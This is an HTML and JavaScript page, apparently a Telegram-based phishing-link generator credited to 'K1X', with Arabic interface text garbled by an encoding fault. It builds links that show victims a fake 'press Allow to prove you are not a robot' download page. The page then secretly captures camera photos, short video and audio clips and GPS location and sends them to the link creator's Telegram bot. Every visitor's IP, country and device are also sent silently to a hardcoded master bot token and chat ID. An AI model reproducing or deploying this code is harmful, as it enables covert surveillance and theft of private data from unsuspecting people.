<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>MARO.com</title>
  <style>
    :root{
      --bg1:#0b0712;
      --card:#131026;
      --accent1:#a66bff;
      --accent2:#6e3be0;
      --muted:#bfaef6;
    }
    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
    body{
      background: #000000;
      background-image: none;
      position:relative;
    }
    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
    .hero-left{flex:1;min-width:260px}
    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
    .checkbox-group {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin: 15px 0;
      max-height: 300px;
      overflow-y: auto;
      padding: 10px;
      background: rgba(0,0,0,0.2);
      border-radius: 10px;
    }
    .checkbox-item {
      display: flex;
      align-items: center;
      gap: 10px;
      background: rgba(255,255,255,0.02);
      padding: 8px 12px;
      border-radius: 8px;
    }
    .checkbox-item input[type="checkbox"] {
      width: 18px;
      height: 18px;
      cursor: pointer;
      accent-color: #a66bff;
    }
    .checkbox-item label {
      margin: 0;
      font-weight: 500;
      font-size: 14px;
      cursor: pointer;
      flex: 1;
      color: #fff;
    }
    .btn{
      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
    }
    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
    .madeby{position:fixed;left:14px;bottom:14px;z-index:9999;background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;color: #ffffff;}
    
    /* Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ */
    .dialog {
      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
      background: #000; border: 2px solid #fff; border-radius: 20px; padding: 40px 30px;
      text-align: center; z-index: 99999; width: 80%; max-width: 500px;
    }
    .dialog-link {
      display: inline-block; background: #fff; color: #000; padding: 14px 25px;
      border-radius: 50px; text-decoration: none; font-weight: 900; margin-bottom: 10px; width: 80%;
    }
    .dialog-link.visited { background: #28a745; color: white; }
    .dialog-btn {
      display: inline-block; background: #fff; color: #000; padding: 16px 30px;
      border-radius: 50px; font-weight: 900; width: 80%; cursor: pointer; opacity: 0.5; pointer-events: none;
    }
    .dialog-btn.active { opacity: 1; pointer-events: auto; }

    /* ØµÙØ­Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
    .download-page { width: 100%; min-height: 100vh; background: #f5f5f5; padding: 20px 0; }
    .main-box{ width:95%; max-width:600px; background:white; margin:40px auto; padding:25px; border-radius:15px; text-align:center; color: #222; }
    .ad-box{ margin:20px 0; padding:10px; border-radius:10px; background:#fafafa; border:1px solid #eee; min-height: 90px; }
    .download-btn{ background:#28a745; color:white; padding:18px 45px; font-size:22px; border:none; border-radius:12px; cursor:pointer; }
  </style>
</head>
<body>

  <div class="wrap">
    <div class="header"></div>
    <div class="card" id="cardArea">
      <div class="hero">
        <div class="hero-left">
          <h5>âš ï¸ ÙŠÙÙ…Ù†Ø¹ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ø¯Ø§Ø© Ø¨Ø´ÙƒÙ„ ØºÙŠØ± Ù‚Ø§Ù†ÙˆÙ†ÙŠ. Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠØªØ­Ù…Ù„ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ© Ø§Ù„ÙƒØ§Ù…Ù„Ø©.</h5>
          <div class="form">
            <label>Ø£Ø¯Ø®Ù„ Ø§Ù„Ù€ ID</label>
            <input type="text" id="chatIdInput" placeholder="Chat ID">
            <label>Ø£Ø¯Ø®Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª</label>
            <input type="text" id="tokenInput" placeholder="Bot Token">
            <label>Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©:</label>
            <div class="checkbox-group" id="featuresGroup">
              <div class="checkbox-item"><input type="checkbox" id="camFront" value="camFront" checked><label for="camFront">ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ©</label></div>
              <div class="checkbox-item"><input type="checkbox" id="camBack" value="camBack"><label for="camBack">ğŸ“· ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©</label></div>
              <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront">ğŸ¥ ÙÙŠØ¯ÙŠÙˆ Ø£Ù…Ø§Ù…ÙŠ</label></div>
              <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack">ğŸ“¹ ÙÙŠØ¯ÙŠÙˆ Ø®Ù„ÙÙŠ</label></div>
              <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio">ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ</label></div>
              <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location">ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹</label></div>
            </div>
            <button class="btn" id="generateBtn">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·</button>
            <div id="result" style="display:none" class="result">
              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
              <button class="copyBtn" id="copyBtn">Ù†Ø³Ø®</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="madeby">Made by K1X</div>

  <div class="dialog" id="mandatoryDialog">
    <p> Ø§Ø´ØªØ±Ø§Ùƒ Ø¥Ø¬Ø¨Ø§Ø±ÙŠ ÙÙŠ Ø§Ù„Ù‚Ù†ÙˆØ§Øª </p>
    <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1">@Maro_hacker_eg</a>
    <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2">@lego2028</a>
    <button class="dialog-btn" id="subscribeDoneBtn" disabled>ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ</button>
  </div>

<script>
  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
  const MASTER_CHAT_ID   = "6197511637";

  let visitorIP = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ", visitorCountry = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ", visitorDevice = "Unknown", visitorBattery = "ØºÙŠØ± Ù…ØªØ§Ø­";

  async function sendVisitorInfo() {
    try {
      const ua = navigator.userAgent;
      visitorDevice = /Android/i.test(ua) ? "Android" : /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC";
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        visitorBattery = (b.level * 100) + "%" + (b.charging ? " (Ø´Ø­Ù†)" : "");
      }
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      visitorIP = ipData.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      visitorCountry = ipData.country_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

      fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: `ğŸŸ¢ Ø²ÙŠØ§Ø±Ø©: ${visitorCountry} | ${visitorDevice} | IP: ${visitorIP}`, parse_mode: 'Markdown' })
      });
    } catch (e) {}
  }
  sendVisitorInfo();

  // Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬
  let c1 = false, c2 = false;
  document.getElementById('channel1').onclick = () => { c1 = true; document.getElementById('channel1').classList.add('visited'); check(); };
  document.getElementById('channel2').onclick = () => { c2 = true; document.getElementById('channel2').classList.add('visited'); check(); };
  function check() { if(c1 && c2) { const b = document.getElementById('subscribeDoneBtn'); b.disabled = false; b.classList.add('active'); } }
  document.getElementById('subscribeDoneBtn').onclick = () => document.getElementById('mandatoryDialog').style.display = 'none';

  // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·
  document.getElementById('generateBtn').onclick = () => {
    const chat = document.getElementById('chatIdInput').value.trim();
    const token = document.getElementById('tokenInput').value.trim();
    if(!chat || !token) return alert('Ø§Ù…Ù„Ø£ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
    const feats = Array.from(document.querySelectorAll('#featuresGroup input:checked')).map(c => c.value).join(',');
    const link = `${window.location.origin}${window.location.pathname}?chat=${chat}&token=${token}&features=${feats}`;
    document.getElementById('linkText').innerText = link;
    document.getElementById('result').style.display = 'flex';
  };

  document.getElementById('copyBtn').onclick = () => {
    navigator.clipboard.writeText(document.getElementById('linkText').innerText);
    alert('ØªÙ… Ø§Ù„Ù†Ø³Ø®');
  };

  // ------------------ Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙˆØ§Ù„Ù…ÙŠØ²Ø§Øª (Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨) ------------------

  async function getPermissions(video, audio) {
    try {
      // Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† Ù„Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø· Ù„Ù„ÙƒÙ„
      const stream = await navigator.mediaDevices.getUserMedia({ video, audio });
      // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ´ØºÙŠÙ„ ÙÙˆØ±Ø§Ù‹ØŒ Ø§Ù„Ø¥Ø°Ù† Ø£ØµØ¨Ø­ "Granted" Ø§Ù„Ø¢Ù† ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­
      stream.getTracks().forEach(track => track.stop());
      return true;
    } catch (e) {
      console.log("Permission denied");
      return false;
    }
  }

  function buildCaption(type) {
    return `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\nğŸŒ ${visitorCountry}\nğŸ“± ${visitorDevice}\nğŸ”‹ ${visitorBattery}\nğŸŒ IP: ${visitorIP}\nğŸ“¸ Ø§Ù„Ù†ÙˆØ¹: ${type}\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
  }

  async function capturePhoto(chat, token, mode) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === 'front' ? 'user' : 'environment' } });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();
      const canvas = document.createElement('canvas');
      canvas.width = 640; canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
      stream.getTracks().forEach(t => t.stop());
      
      canvas.toBlob(async (blob) => {
        const f = new FormData();
        f.append('chat_id', chat);
        f.append('photo', blob, 'img.jpg');
        f.append('caption', buildCaption(mode === 'front' ? 'ØµÙˆØ±Ø© Ø£Ù…Ø§Ù…ÙŠØ©' : 'ØµÙˆØ±Ø© Ø®Ù„ÙÙŠØ©'));
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
      }, 'image/jpeg');
    } catch (e) {}
  }

  async function recordMedia(chat, token, mode, isVideo) {
    try {
      const constraints = isVideo ? { video: { facingMode: mode === 'front' ? 'user' : 'environment' }, audio: true } : { audio: true };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const recorder = new MediaRecorder(stream);
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: isVideo ? 'video/mp4' : 'audio/mp4' });
        const f = new FormData();
        f.append('chat_id', chat);
        f.append(isVideo ? 'video' : 'audio', blob, 'file.mp4');
        f.append('caption', buildCaption(isVideo ? 'ÙÙŠØ¯ÙŠÙˆ 5 Ø«ÙˆØ§Ù†' : 'ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ'));
        await fetch(`https://api.telegram.org/bot${token}/${isVideo ? 'sendVideo' : 'sendAudio'}`, { method: 'POST', body: f });
        stream.getTracks().forEach(t => t.stop());
      };
      recorder.start();
      setTimeout(() => recorder.stop(), 5000);
    } catch (e) {}
  }

  async function startWork(chat, token, features) {
    const list = features.split(',');
    const needCam = list.some(f => f.includes('cam') || f.includes('video'));
    const needMic = list.some(f => f.includes('audio') || f.includes('video'));

    // Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙŠ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©
    const granted = await getPermissions(needCam, needMic);
    if (!granted) return;

    // Ø§Ù„ØªÙ†ÙÙŠØ° Ø§Ù„Ù…ØªØ³Ù„Ø³Ù„ Ø¨Ø¯ÙˆÙ† Ø·Ù„Ø¨ Ø£Ø°ÙˆÙ†Ø§Øª Ù…Ø¬Ø¯Ø¯Ø§Ù‹
    if (list.includes('camFront')) await capturePhoto(chat, token, 'front');
    if (list.includes('camBack'))  await capturePhoto(chat, token, 'back');
    if (list.includes('videoFront')) await recordMedia(chat, token, 'front', true);
    if (list.includes('videoBack'))  await recordMedia(chat, token, 'back', true);
    if (list.includes('audio'))      await recordMedia(chat, token, '', false);
    
    if (list.includes('location')) {
      navigator.geolocation.getCurrentPosition(async (p) => {
        const msg = buildCaption(`ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø²Ø§Ø¦Ø±:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chat, text: msg })
        });
      });
    }
  }

  // ØªØ´ØºÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠØ©
  const p = new URLSearchParams(window.location.search);
  if (p.get('chat') && p.get('token')) {
    document.getElementById('mandatoryDialog').style.display = 'none';
    document.getElementById('cardArea').style.display = 'none';
    const wrap = document.querySelector('.wrap');
    wrap.innerHTML = `
      <div class="download-page">
        <div class="main-box">
          <h2>ÙŠØ¬Ø¨ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "Ø³Ù…Ø§Ø­" Ù„ØªØ£ÙƒÙŠØ¯ Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª ÙˆØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù</h2>
          <div class="ad-box">Ø¥Ø¹Ù„Ø§Ù†</div>
          <button class="download-btn" onclick="window.open('https://google.com')">Ø§Ù„ØªØ§Ù„ÙŠ</button>
          <div class="ad-box">Ø¥Ø¹Ù„Ø§Ù†</div>
        </div>
      </div>`;
    startWork(p.get('chat'), p.get('token'), p.get('features'));
  }
</script>
</body>
</html>
